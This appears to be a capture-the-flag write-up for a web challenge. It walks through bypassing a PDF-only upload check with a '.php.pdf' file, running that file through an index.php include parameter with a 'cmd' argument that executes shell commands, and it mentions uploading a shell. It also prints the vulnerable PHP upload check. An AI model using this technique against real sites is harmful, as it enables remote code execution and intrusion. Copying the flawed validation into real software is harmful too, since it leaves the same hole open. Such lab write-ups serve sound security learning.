
after navigating through tabs figure out the system looks like :
```
/
├── index.php
├── home
├── about
├── jobs
├── data 'directory'
```
and any file passed to index.php? will be printed out on it . 

upload page and is looks like it checks if it ends with .pdf file 
1-  make small php file 

![image](https://user-images.githubusercontent.com/67979878/129133365-da552e3e-0190-453d-9818-3e9b93785c7a.png)

2- change extension to .php.pdf 

3-upload it successfully 

4-it will redirect you to  :

`http://18.192.3.151/join-team/index.php/data/test.php.pdf`

5- execute it by :

we pass the pdf file as parameter so it will get executed into the index.php file 

`http://18.192.3.151/join-team/index.php?data/test.php.pdf`


you can upload a shell or just read the index.php file 

in my case:

`http://18.192.3.151/join-team/?data/test.php.pdf&cmd=cat index.php`

now we can read flag at page source :)


code after clearing flag ;) , to understand how it checks file upload 
```
<?php 
if($_FILES){

  $cv = $_FILES['cv'];
  if($cv['type'] != 'application/pdf'){
    echo 'Only PDF Document Allowed';
    exit;
  }
  
  //check extention
  $ext = pathinfo($cv['name'], PATHINFO_EXTENSION);
  if($ext != 'pdf'){
    echo 'Only pdf Extention Are Allowed';
    exit;
  }
  
  move_uploaded_file($cv['tmp_name'], 'data/'.$cv['name']);

  echo 'Your cv has been uploaded successfully in <a href="data/'.$cv['name'].'">'.$cv['name'].'</a>';
  exit;
}

?>

```
# done
